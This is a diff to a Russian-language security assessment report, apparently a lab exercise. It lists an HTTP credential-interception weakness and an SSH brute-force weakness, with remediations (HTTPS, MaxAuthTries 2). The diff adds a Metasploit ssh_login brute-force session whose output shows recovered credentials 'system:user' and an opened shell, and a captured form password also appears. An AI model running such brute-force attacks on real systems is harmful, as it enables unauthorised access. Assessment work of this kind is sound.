@@ -6,7 +6,12 @@
 
 
 2. Отчет о найденных "слабостях" (которые могут привести к уязвимостям) и предложение по необходимым мерам для их устранения (если такие меры возможно принять).
-2.1 Использование протокоа http. Злоумышленик может перехватить данные аутентификации пользователя.
+2.1 Использование протокол http. Злоумышленик может перехватить данные аутентификации пользователя.
+переход на протокол https
+2.2 Использование ssh 7.6p1 brutforce паролей
+в настройках ssh меняем праметр MaxAuthTries 
+MaxAuthTries — количество попыток входа в систему за один сеанс. При достижении максимально разрешенного числа попыток, сеанс обрывается.
+MaxAuthTries 2
 
 
 
@@ -20,6 +25,23 @@ HTML Form URL Encoded: application/x-www-form-urlencoded
     Form item: "password" = "14a57c60-6128-4db5-8f27-0433870466b0"
         Key: password
         Value: 14a57c60-6128-4db5-8f27-0433870466b0
+        
+3.2 brut-force ssh service
+файл usr_pass.txt содержит пару логин пароль
+msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.0.1
+RHOSTS => 192.168.0.1
+msf6 auxiliary(scanner/ssh/ssh_login) > set USERPASS_FILE /home/kali/usr_pass.txtUSERPASS_FILE => /home/kali/usr_pass.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE false 
+VERBOSE => false
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+
+[*] 192.168.0.1:22 - Starting bruteforce
+[+] 192.168.0.1:22 - Success: 'system:user' 'uid=1000(system) gid=1000(system) groups=1000(system),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare) Linux sk 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux '
+[*] SSH session 1 opened (192.168.0.10:32989 -> 192.168.0.1:22) at 2023-03-12 10:07:59 -0400
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+ 
+
         
 
         
